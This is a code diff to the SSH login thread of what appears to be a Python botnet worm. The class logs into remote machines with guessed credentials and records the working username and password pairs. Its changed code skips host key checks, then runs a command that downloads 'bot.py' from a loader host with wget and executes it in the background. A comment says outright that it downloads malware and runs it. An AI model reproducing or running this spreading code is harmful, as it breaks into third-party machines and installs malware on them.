@@ -157,28 +157,24 @@ class ssh_login(Thread):
         global OPEN_IPS
         s = paramiko.SSHClient()
         s.load_system_host_keys()
-        s.set_missing_host_key_policy(paramiko.WarningPolicy)
+        s.set_missing_host_key_policy(paramiko.AutoAddPolicy)
 
         try:
-            s.connect(self._ip, 22, self._uname, self._pwd, timeout=1, auth_timeout=1)
-
-            """
-            # Copy malware locally and execute.
-            sftp = paramiko.SFTPClient.from_transport(s)
-            sftp.put('/tmp/bot.py', '/tmp/bot.py')
-            stdin, stdout, stderr = s.exec_command("python3 /tmp/bot.py &")
-            """
-
+            s.connect(self._ip, 22, self._uname, self._pwd, timeout=2, auth_timeout=2)
             # Download malware from loader and execute.
-            #cmd = "cd /tmp/;curl -X GET http://{}:{}/bot.py > bot.py;python3.6 bot.py {} {} &".format(MOD_IP, LOADER_PORT, MOD_IP, OUR_DNS)
-            cmd = "wget -O bot.py {}:{}/bot.py;python3 bot.py {} {} &".format(MOD_IP, LOADER_PORT, MOD_IP, OUR_DNS)
-            s.exec_command(cmd)
-            
+            cmd = "wget -O /tmp/bot.py {}:{}/bot.py;python3 bot.py {} {} &".format(MOD_IP, LOADER_PORT, MOD_IP, OUR_DNS)
+            sin, sout, serr = s.exec_command(cmd)
+            sout.channel.recv_exit_status()
+
             print('Login successful using {} {} {}.'.format(self._ip, self._uname, self._pwd))
             with LOCK:
                 OPEN_IPS[self._ip]['login'] = True
                 OPEN_IPS[self._ip]['uname'] = self._uname
                 OPEN_IPS[self._ip]['pwd'] = self._pwd
+        except paramiko.ssh_exception.NoValidConnectionsError:
+            with LOCK:
+                del OPEN_IPS[self._ip]
+            print('Port closed for IP: {}. Deleting'.format(self._ip))
         except:
             pass
             #print('Login Failed.')
